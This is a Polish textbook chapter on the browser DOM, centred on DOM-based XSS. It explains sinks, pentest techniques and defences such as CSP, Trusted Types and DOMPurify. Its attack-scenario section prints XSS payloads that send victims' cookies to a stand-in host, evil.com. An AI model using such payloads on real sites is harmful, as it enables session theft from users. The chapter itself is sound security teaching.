# Rozdział 9: DOM

## 1. Czym jest DOM

**DOM** (Document Object Model) to programistyczny interfejs (API) dla dokumentów HTML i XML. Reprezentuje dokument jako drzewo węzłów (nodes), gdzie każdy element HTML, atrybut, tekst czy komentarz jest osobnym węzłem z właściwościami i metodami.

DOM jest standardem W3C/WHATWG — nie jest częścią specyfikacji JavaScript (ECMAScript). To Web API implementowane przez przeglądarki. Każda przeglądarka buduje własną implementację DOM w C++, udostępniając ją kodowi JavaScript.

DOM jest "żywą" (live) reprezentacją dokumentu — zmiany w DOM są natychmiast odzwierciedlane w tym co widzi użytkownik, a zmiany w dokumencie (np. przez innerHTML parsing) są odzwierciedlane w DOM.

### Interfejsy DOM (wybrane)

- `document` — główny obiekt dokumentu (implementuje `Document`)
- `document.getElementById()`, `querySelector()`, `querySelectorAll()`
- `element.innerHTML`, `element.textContent`, `element.innerText`
- `element.setAttribute()`, `element.getAttribute()`
- `document.createElement()`, `element.appendChild()`, `element.removeChild()`
- `element.addEventListener()`, `element.dispatchEvent()`
- `element.classList`, `element.style`
- `window.getComputedStyle()`
- `MutationObserver` — obserwowanie zmian w DOM

### Gdzie działa

DOM działa w przeglądarce — to interfejs między JavaScript a renderowanym dokumentem. W Node.js standardowo nie ma DOM (można dodać przez bibliotekę jsdom).

---

## 2. Dlaczego powstał

### Problem: statyczne dokumenty

Pierwotnie strony HTML były statycznymi dokumentami. JavaScript potrzebował sposobu na:
- Odczytywanie treści strony
- Modyfikowanie treści bez przeładowania
- Reagowanie na akcje użytkownika

DOM (wersja 0, nieformalny standard) pojawił się razem z pierwszymi przeglądarkami. W3C sformalizował DOM Level 1 w 1998, DOM Level 2 w 2000, DOM Level 3 w 2004.

### Problem: różne implementacje

Przez lata Netscape i Internet Explorer miały niespójne implementacje DOM — to był tzw. "Browser War". jQuery stało się popularne właśnie dlatego, że ukrywało te różnice za jednolitym API. Dopiero od ok. 2015 implementacje są wystarczająco zgodne ze specyfikacją WHATWG.

---

## 3. Jak działa

### Struktura drzewa DOM

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Przykład</title>
  </head>
  <body>
    <h1 id="title">Nagłówek</h1>
    <p class="text">Akapit z <strong>pogrubieniem</strong></p>
  </body>
</html>
```

Drzewo DOM:

```
Document
│
└── html (Element)
    │
    ├── head (Element)
    │   └── title (Element)
    │       └── "Przykład" (Text)
    │
    └── body (Element)
        │
        ├── h1 (Element) [id="title"]
        │   └── "Nagłówek" (Text)
        │
        └── p (Element) [class="text"]
            │
            ├── "Akapit z " (Text)
            │
            └── strong (Element)
                └── "pogrubieniem" (Text)
```

### Typy węzłów

| Typ | Stała | Przykład |
|-----|-------|---------|
| Element | `Node.ELEMENT_NODE` (1) | `<div>`, `<p>` |
| Attribute | `Node.ATTRIBUTE_NODE` (2) | `class="foo"` |
| Text | `Node.TEXT_NODE` (3) | "tekst" |
| Comment | `Node.COMMENT_NODE` (8) | `<!-- komentarz -->` |
| Document | `Node.DOCUMENT_NODE` (9) | `document` |
| DocumentType | `Node.DOCUMENT_TYPE_NODE` (10) | `<!DOCTYPE html>` |

### Parsing HTML → DOM

```
HTML string (text)
    │
    ▼
HTML Parser (przeglądarka)
    │ tokenizacja: <div>, "tekst", </div>
    ▼
DOM Tree budowane w pamięci
    │
    ▼ DOM API wywoływane z JS
JavaScript może czytać/modyfikować DOM
    │
    ▼ zmiana w DOM
Layout Engine przelicza układ
    │
    ▼
Paint Engine renderuje piksele
    │
    ▼
Użytkownik widzi zmiany
```

### innerHTML — parsing HTML

`element.innerHTML = "<p>tekst</p>"` wywołuje parser HTML:
1. String jest parsowany jako HTML fragment
2. Tworzone są węzły DOM
3. Są dodawane jako dzieci elementu

To jest **powód dlaczego innerHTML jest podatny na XSS** — jeśli string zawiera `<script>`, parser tworzy element script (choć jest to zazwyczaj blokowane w nowoczesnych przeglądarkach), lub `<img onerror="...">` — parser tworzy element z atrybutem onerror.

### textContent vs innerHTML vs innerText

```javascript
const div = document.getElementById("test");

// textContent — bezpieczne, nie parsuje HTML
div.textContent = "<b>tekst</b>"; // wyświetli literalnie: <b>tekst</b>

// innerHTML — parsuje HTML — NIEBEZPIECZNE z niezaufanymi danymi
div.innerHTML = "<b>tekst</b>"; // wyświetli: **tekst** (pogrubiony)
div.innerHTML = "<img src=x onerror=alert(1)>"; // XSS!

// innerText — podobne do textContent, ale bierze pod uwagę CSS (widoczność)
div.innerText = "<b>tekst</b>"; // wyświetli literalnie: <b>tekst</b>
```

---

## 4. Co dzieje się wewnętrznie

### DOM jako C++ obiekt udostępniony JS

Gdy piszesz `document.getElementById("title")`, V8 wywołuje binding (powiązanie) do kodu C++ w przeglądarce. Obiekt zwrócony to "wrapper" — obiekt JavaScript opakowujący wskaźnik C++ do węzła DOM.

Dlatego manipulacja DOM jest relatywnie wolna w porównaniu do czystych operacji JavaScript — każde odwołanie do DOM to przejście przez most JS↔C++.

### Layout Thrashing

Przeglądarka "odkłada" zmiany DOM i oblicza layout razem. Ale pewne operacje *wymuszają* natychmiastowe obliczenie layoutu (Forced Synchronous Layout):

```javascript
// Layout Thrashing — bardzo wolne!
elements.forEach(el => {
    el.style.width = el.offsetWidth + 10 + "px"; // ODCZYT (wymusza layout) + ZAPIS
    // Przeglądarka musi przeliczać layout dla każdego elementu
});

// Poprawka: oddziel odczyty od zapisów
const widths = elements.map(el => el.offsetWidth); // wszystkie odczyty
elements.forEach((el, i) => el.style.width = widths[i] + 10 + "px"); // wszystkie zapisy
```

### Shadow DOM vs Light DOM

Standardowy DOM to "Light DOM". **Shadow DOM** to enkapsulowany poddrzewo DOM przypisane do elementu — niewidoczne z zewnątrz (szczegóły w rozdziale 31).

### MutationObserver

API do obserwowania zmian w DOM bez pollingu:

```javascript
const observer = new MutationObserver((mutations) => {
    mutations.forEach(mutation => {
        console.log("Zmiana:", mutation.type, mutation.target);
    });
});

observer.observe(document.body, {
    childList: true,  // obserwuj dodawanie/usuwanie dzieci
    subtree: true,    // i ich poddrzewa
    attributes: true  // i zmiany atrybutów
});
```

MutationObserver callbacks trafiają do Microtask Queue — są wywoływane po synchronicznym kodzie ale przed Macrotaskami.

---

## 5. Analogiczny przykład z życia

DOM to plan budynku w 3D:

- **Dokument** = cały budynek
- **Element** = pokój, ściana, okno, drzwi
- **Atrybut** = właściwości elementu (kolor ściany, rozmiar okna)
- **Tekst** = meble i dekoracje wewnątrz pokoju

JavaScript to architekt z dostępem do planu:
- Może odczytywać plan (`querySelector`)
- Może modyfikować plan (`innerHTML`, `setAttribute`)
- Może dodawać nowe pomieszczenia (`createElement`, `appendChild`)
- Może obserwować zmiany (`MutationObserver`)

**XSS** = ktoś wstrzyknął do planu instrukcje "przy każdym wejściu do lobby, sfotografuj gości i wyślij zdjęcia na adres X" — plan zawiera złośliwe instrukcje, budynek je wykonuje.

---

## 6. Przykład kodu

```javascript
// === Bezpieczne vs niebezpieczne operacje DOM ===

// 1. Pobieranie elementów
const container = document.getElementById("product-list");    // po ID
const cards = document.querySelectorAll(".product-card");     // CSS selector
const firstCard = document.querySelector(".product-card");    // pierwszy pasujący

// 2. Odczyt właściwości (bezpieczne)
const title = firstCard.textContent;        // czysta treść tekstowa
const dataId = firstCard.dataset.productId; // atrybut data-product-id

// 3. NIEBEZPIECZNA modyfikacja HTML
const userComment = '<img src=x onerror="alert(document.cookie)">';
container.innerHTML = userComment; // XSS! Parser wykonuje atrybut onerror

// 4. BEZPIECZNA modyfikacja tekstu
container.textContent = userComment; // wyświetli literalnie <img...>

// 5. Tworzenie elementów (bezpieczne — nie parsuje HTML)
const p = document.createElement("p");        // tworzy węzeł Element
const text = document.createTextNode(userComment); // tworzy węzeł Text (bezpieczny!)
p.appendChild(text);                          // dodaje Text do p
container.appendChild(p);                     // dodaje p do DOM

// Efekt: paragraf z tekstem literalnym "<img src=x onerror=...>" — bezpieczny!

// 6. Ustawianie atrybutów
const link = document.createElement("a");
link.setAttribute("href", userInput);    // UWAGA: jeśli userInput = "javascript:alert(1)"
link.textContent = "Kliknij";
// Bezpieczniej: sprawdź URL
function setSafeHref(element, url) {
    try {
        const parsed = new URL(url);
        if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
            throw new Error("Unsafe protocol");
        }
        element.setAttribute("href", url);
    } catch {
        element.setAttribute("href", "#");
    }
}

// 7. MutationObserver — obserwowanie zmian (np. dla security monitoring)
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "childList") {
            mutation.addedNodes.forEach(node => {
                if (node.nodeName === "SCRIPT") {
                    console.warn("Dynamicznie dodano script!", node.src || node.textContent);
                }
            });
        }
    }
});

observer.observe(document.head, { childList: true, subtree: true });
```

---

## 7. Przykład z prawdziwej aplikacji

### Aplikacja bankowa — wyświetlanie transakcji

```javascript
// Podatny kod wyświetlający historię transakcji
function renderTransactions(transactions) {
    const list = document.getElementById("transactions");
    
    // BŁĄD: jeśli description pochodzi z serwera bez escapowania,
    // XSS może być przechowywany w bazie danych (Stored XSS)
    list.innerHTML = transactions.map(t => `
        <div class="transaction">
            <span>${t.date}</span>
            <span>${t.description}</span>  <!-- PODATNOŚĆ: stored XSS -->
            <span>${t.amount}</span>
        </div>
    `).join('');
}

// Bezpieczna wersja — escape przed wstawieniem
function escapeHtml(str) {
    const div = document.createElement("div");
    div.textContent = str;  // textContent escapuje automatycznie
    return div.innerHTML;    // zwraca HTML-escaped string
}

function renderTransactionsSafe(transactions) {
    const list = document.getElementById("transactions");
    list.innerHTML = ""; // wyczyść
    
    transactions.forEach(t => {
        const div = document.createElement("div");
        div.className = "transaction";
        
        const date = document.createTextNode(t.date);
        const desc = document.createTextNode(t.description); // bezpieczne!
        const amount = document.createTextNode(t.amount);
        
        div.append(date, " ", desc, " ", amount);
        list.appendChild(div);
    });
}
```

### Sklep internetowy — dynamiczne ładowanie produktów

```javascript
// Wzorzec SPA — dynamiczne aktualizowanie DOM
async function loadProducts(category) {
    const response = await fetch(`/api/products?category=${encodeURIComponent(category)}`);
    const products = await response.json();
    
    // Framework (np. React) używa Virtual DOM:
    // 1. Tworzy Virtual DOM (JS obiekty)
    // 2. Porównuje z poprzednim Virtual DOM (diffing)
    // 3. Aktualizuje tylko zmienione węzły w prawdziwym DOM (reconciliation)
    
    // Minimalizuje manipulację DOM → lepsza wydajność
    renderProductList(products);
}
```

---

## 8. Typowe błędy programistów

### Błąd 1: innerHTML z niezaufanymi danymi (XSS)

```javascript
// BŁĄD: najczęstszy błąd w historii web security
const searchQuery = new URLSearchParams(window.location.search).get("q");
document.getElementById("results").innerHTML = 
    `Wyniki dla: ${searchQuery}`; // Reflected XSS!

// URL: /search?q=<img src=x onerror=alert(document.cookie)>
```

### Błąd 2: document.write() po załadowaniu

```javascript
// BŁĄD: document.write po załadowaniu = kasuje całą stronę!
document.getElementById("btn").addEventListener("click", () => {
    document.write("<p>Hello</p>"); // usuwa całą stronę i pisze nową!
});

// Poprawka:
document.getElementById("output").textContent = "Hello";
```

### Błąd 3: Synchroniczne DOM queries w pętlach

```javascript
// BŁĄD: querySelector w pętli → wielokrotne przeszukiwanie DOM
function updatePrices(products) {
    products.forEach(p => {
        document.querySelector(`#product-${p.id} .price`).textContent = p.price;
        // Każdy querySelector skanuje cały DOM
    });
}

// Poprawka: raz pobierz wszystkie, zaktualizuj
function updatePrices(products) {
    const elements = new Map();
    document.querySelectorAll('[id^="product-"]').forEach(el => {
        elements.set(el.id.replace("product-", ""), el.querySelector(".price"));
    });
    
    products.forEach(p => {
        elements.get(p.id)?.textContent = p.price;
    });
}
```

### Błąd 4: Atrybut href/src z niezaufanymi danymi

```javascript
// BŁĄD: javascript: URL protocol
const userUrl = "javascript:alert(document.cookie)";
document.getElementById("link").href = userUrl; // XSS przez href!

// Poprawka: waliduj protokół
function setSafeUrl(element, url) {
    const parsed = new URL(url, window.location.origin);
    if (!["http:", "https:"].includes(parsed.protocol)) return;
    element.href = parsed.href;
}
```

---

## 9. Znaczenie dla bezpieczeństwa

### DOM XSS — trzy typy

**1. Reflected XSS:**
```javascript
// Dane z URL → DOM bez sanityzacji
const name = location.search.replace("?name=", "");
document.getElementById("greeting").innerHTML = "Hello " + name;
// URL: /page?name=<script>alert(1)</script>
```

**2. Stored XSS:**
```javascript
// Dane z serwera (baza danych) → DOM bez sanityzacji
fetch("/api/comments").then(r => r.json()).then(comments => {
    commentsDiv.innerHTML = comments.map(c => `<p>${c.text}</p>`).join(""); // XSS!
    // c.text może zawierać <script> lub <img onerror=...> z bazy danych
});
```

**3. DOM-based XSS:**
```javascript
// Dane nigdy nie trafiają na serwer — tylko w DOM
const hash = location.hash.substring(1); // z URL po #
document.getElementById("tab").innerHTML = hash; // XSS!
// URL: /page#<img src=x onerror=alert(1)>
// Serwer nigdy nie widział payloadu → WAF go nie wykryje!
```

### XSS Sink — miejsca wykonania

| Sink | Typ | Podatny |
|------|-----|---------|
| `innerHTML` | Property | Tak |
| `outerHTML` | Property | Tak |
| `document.write()` | Method | Tak |
| `document.writeln()` | Method | Tak |
| `element.insertAdjacentHTML()` | Method | Tak |
| `eval()` | Method | Tak |
| `setTimeout(string)` | Method | Tak |
| `element.href = "javascript:..."` | Property | Tak |
| `textContent` | Property | NIE |
| `innerText` | Property | NIE |
| `createTextNode()` | Method | NIE |
| `setAttribute("href", safeUrl)` | Method | Zależy |

### DOM Clobbering (szczegóły w rozdziale 10)

Atrybuty `id` i `name` w HTML mogą "zaśmiecać" globalne właściwości `window`:

```html
<form id="config">
    <input name="isAdmin" value="true">
</form>
```

```javascript
// Teraz window.config to element <form>
// window.config.isAdmin to element <input>
if (window.config && window.config.isAdmin) {
    // Ta logika może być naiwnie true jeśli element istnieje
}
```

### CSP i DOM

Content Security Policy (CSP) ogranicza co może być wykonane w DOM:
- `script-src 'self'` — blokuje inline scripts i external scripts z innych origins
- `img-src 'self'` — blokuje exfiltrację danych przez obrazki
- `form-action 'self'` — blokuje przekierowanie formularzy

### Powiązane CWE

- **CWE-79** — Improper Neutralization of Input During Web Page Generation (XSS)
- **CWE-80** — Improper Neutralization of Script-Related HTML Tags in a Web Page
- **CWE-116** — Improper Encoding or Escaping of Output
- **CWE-79** — Cross-site Scripting

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Elements

1. Otwórz **Elements** (Ctrl+Shift+C lub F12 → Elements)
2. Przeglądaj drzewo DOM
3. Kliknij prawym na element → **Edit as HTML** — edytuj DOM bezpośrednio
4. Szukaj:
   - Elementów z `id` lub `name` które mogą kolidować z globalnymi (`window.config`)
   - Script tagów ładowanych dynamicznie
   - Inline event handlers: `onclick="..."`, `onmouseover="..."`
   - Komentarzy HTML zawierających informacje debug

### DevTools → Console — testowanie XSS sinks

```javascript
// Znajdź wszystkie innerHTML sinks w aktywnym kodzie
// Metoda: szukaj w Sources, lub użyj Proxy na DOMParser

// Sprawdź źródło danych dla elementów
document.querySelectorAll("[data-from-server]").forEach(el => {
    console.log(el.innerHTML); // czy zawiera niezeskapowany HTML z serwera?
});

// Testuj DOM-based XSS przez hash
location.hash = '<img src=x onerror=console.log("XSS",this)>';
// Odśwież i sprawdź czy alert/log się pojawił
```

### Burp Suite — DOM XSS

W Burp Suite → **DOM Invader** (wbudowane narzędzie do DOM XSS):
1. Włącz DOM Invader w Burp Browser
2. Odwiedź docelową stronę
3. Kliknij **Scan for DOM XSS** w Burp
4. DOM Invader wstrzykuje kanary i śledzi flow danych

### Szukanie Source → Sink flows

```
Sources (wejście danych do JS):
- location.search, location.hash, location.href
- document.referrer
- window.name
- postMessage events
- localStorage, sessionStorage
- cookies (document.cookie)
- fetch response data

Sinks (miejsca wykonania):
- innerHTML, outerHTML
- document.write()
- eval()
- setTimeout("string")
- element.src, element.href, element.action
- insertAdjacentHTML()
```

Śledź flow: czy dane z Source trafiają do Sink bez sanityzacji?

### DevTools → Search

`Ctrl+Shift+F` w DevTools → szukaj w plikach:
```
innerHTML
document.write
eval(
setTimeout(
location.search
location.hash
document.cookie
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy innerHTML jest używany z danymi z URL (location.search/hash)?
□ Czy innerHTML jest używany z danymi z serwera (API responses)?
□ Czy innerHTML jest używany z danymi z localStorage/sessionStorage?
□ Czy document.write() jest używany z zewnętrznymi danymi?
□ Czy eval() lub new Function() są używane z zewnętrznymi danymi?
□ Czy linki href są budowane z danych użytkownika (javascript: injection)?
□ Czy src atrybuty obrazków/iframe mogą być kontrolowane przez użytkownika?
□ Czy MutationObserver wykrywa nieoczekiwane modyfikacje DOM?
□ Czy DOM Clobbering jest możliwe (elementy z id kolidującymi z window.*)?
□ Czy inline event handlers (onclick="...") są obecne z dynamiczną treścią?
□ Czy Trusted Types są włączone (blokuje dynamiczne innerHTML)?
□ Czy CSP ogranicza wykonanie inline scripts i eval?
□ Czy dane z postMessage są walidowane przed wstawieniem do DOM?
□ Czy shadow DOM jest używany do izolacji komponentów?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: Reflected XSS przez search parameter

**Wymagania:** Aplikacja wyświetla parametr search z URL w DOM przez innerHTML.

**Przebieg:**
1. Pentester identyfikuje: `document.querySelector("#results").innerHTML = searchParam`
2. Konstruuje URL: `/search?q=<img src=x onerror=fetch('https://evil.com/'+document.cookie)>`
3. Nakłania ofiarę do kliknięcia URL (phishing)
4. Przeglądarka ładuje stronę, JavaScript wstawia payload do innerHTML
5. Parser HTML wykonuje `onerror` handler
6. Cookies ofiary trafiają do serwera atakującego

**Ograniczenia:** CSP `default-src 'self'` blokuje zewnętrzny fetch. HTTPOnly cookies nie dostępne przez `document.cookie`.

### Scenariusz 2: DOM-based XSS przez fragment URL

**Wymagania:** Aplikacja czyta `location.hash` i wstawia do DOM.

**Przebieg:**
1. `https://victim.com/app#<img src=x onerror=alert(1)>`
2. Serwer nie widzi fragmentu (`#...`) — WAF nie wykryje!
3. JavaScript czyta `location.hash.slice(1)` i wstawia `innerHTML`
4. Payload wykonuje się tylko w przeglądarce ofiary

**Ograniczenia:** Wymaga kliknięcia przez użytkownika lub otwartego redirecta.

### Scenariusz 3: Stored XSS przez komentarze

**Wymagania:** Aplikacja zapisuje komentarze użytkownika bez sanityzacji i wyświetla je przez innerHTML.

**Przebieg:**
1. Atakujący dodaje komentarz: `Świetny artykuł! <script>document.location='https://evil.com/'+document.cookie</script>`
2. Serwer zapisuje bez filtrowania
3. Każdy użytkownik odwiedzający stronę z komentarzem uruchamia XSS
4. Ciasteczka każdej ofiary trafiają do atakującego

**Wpływ:** Persistentny XSS — każdy użytkownik jest ofiarą bez konieczności interakcji z atakującym.

---

## 13. Jak się zabezpieczać

### Nigdy nie używaj innerHTML z niezaufanymi danymi

```javascript
// BEZPIECZNE wzorce:

// 1. textContent — escapuje automatycznie
element.textContent = userInput; // <script> staje się tekstem, nie HTML

// 2. createTextNode
const text = document.createTextNode(userInput);
element.appendChild(text);

// 3. Framework z auto-escaping (React, Vue, Angular)
// React: {userInput} → automatycznie bezpieczne
// Vue: {{ userInput }} → automatycznie bezpieczne
// Angular: {{ userInput }} → automatycznie bezpieczne
// WSZYSTKIE frameworki: [innerHTML]="userInput" → NIEBEZPIECZNE (bypassuje escaping)

// 4. DOMPurify — sanityzacja HTML gdy MUSISZ zaakceptować HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(richTextContent);
```

### Content Security Policy

```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'nonce-RANDOM_NONCE';
    style-src 'self';
    img-src 'self' data:;
    connect-src 'self';
    frame-ancestors 'none';
    object-src 'none';
    base-uri 'self';
```

Dobra CSP:
- Eliminuje inline scripts (wymaga nonce lub hash)
- Blokuje `eval()` i `new Function()`
- Ogranicza skąd można ładować zasoby
- Blokuje exfiltrację danych przez nieautoryzowane połączenia

### Trusted Types (Chrome 83+)

```javascript
// Wymusza że innerHTML może przyjmować tylko "trusted" wartości
// Konfiguracja przez meta tag:
// <meta http-equiv="Content-Security-Policy" 
//       content="require-trusted-types-for 'script'">

const policy = trustedTypes.createPolicy("default", {
    createHTML: (input) => {
        return DOMPurify.sanitize(input); // sanityzacja przed wstawieniem
    }
});

// Teraz innerHTML MUSI otrzymać TrustedHTML lub TypeError
element.innerHTML = policy.createHTML(userInput); // OK
element.innerHTML = userInput; // TypeError! — CSP blokuje
```

### Walidacja URL przed wstawieniem

```javascript
function sanitizeUrl(url) {
    try {
        const parsed = new URL(url);
        // Dozwolone tylko http i https
        if (!["http:", "https:"].includes(parsed.protocol)) {
            return "about:blank"; // bezpieczny fallback
        }
        return parsed.href;
    } catch {
        return "about:blank";
    }
}

// Użycie:
link.href = sanitizeUrl(userProvidedUrl);
// Blokuje: javascript:alert(1), data:text/html,..., vbscript:...
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. DOM to Web API — drzewiasta reprezentacja dokumentu HTML dostępna przez JavaScript
2. `innerHTML` parsuje HTML — nigdy nie używaj z niezaufanymi danymi (XSS!)
3. `textContent` jest bezpieczny — nie parsuje HTML, traktuje dane jako tekst
4. Trzy typy XSS: Reflected (z URL), Stored (z bazy), DOM-based (tylko client-side)
5. CSP i Trusted Types to główne mechanizmy ochrony przed DOM XSS

**Najczęstsze nieporozumienia:**

- "Escape po stronie serwera wystarczy" — NIE dla DOM XSS. DOM-based XSS nigdy nie trafia na serwer.
- "React/Vue automatycznie chronią przed XSS" — tylko przy standardowym `{variable}`. `dangerouslySetInnerHTML` i `v-html` są nadal podatne.
- "innerHTML jest szybszy niż tworzenie elementów" — często prawda, ale kosztem bezpieczeństwa. Korzystaj z createElement dla dynamicznych danych użytkownika.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **DevTools → Elements** → Ctrl+F → szukaj podejrzanych elementów (skrypty bez src, inline handlers)
2. **Sources → Ctrl+Shift+F** → szukaj `innerHTML`, `document.write`, `eval(`, `location.hash`
3. **Console** → ustaw breakpoint na `Element.prototype` settery:
   ```javascript
   let origInner = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
   Object.defineProperty(Element.prototype, 'innerHTML', {
       set(val) { console.trace("innerHTML set:", val); origInner.set.call(this, val); }
   });
   ```
4. **Burp DOM Invader** — automatyczna detekcja DOM XSS sinks

---

## Powiązania

```
DOM
    │
    ├──► DOM Clobbering (Rozdział 10)
    │         Atrybuty HTML mogą "zaśmiecać" window.* przez DOM
    │
    ├──► Fetch API (Rozdział 11)
    │         Pobieranie danych przez fetch, wstawianie do DOM
    │
    ├──► CSP (Rozdział 36)
    │         CSP kontroluje co może być wstawione i wykonane w DOM
    │
    ├──► Trusted Types (Rozdział 37)
    │         Trusted Types chroni innerHTML i inne sinks przed XSS
    │
    ├──► Shadow DOM (Rozdział 31)
    │         Enkapsulacja poddrzew DOM przed zewnętrznym dostępem
    │
    └──► MutationObserver → Event Loop (Rozdział 8)
                MO callbacks trafiają do Microtask Queue
```
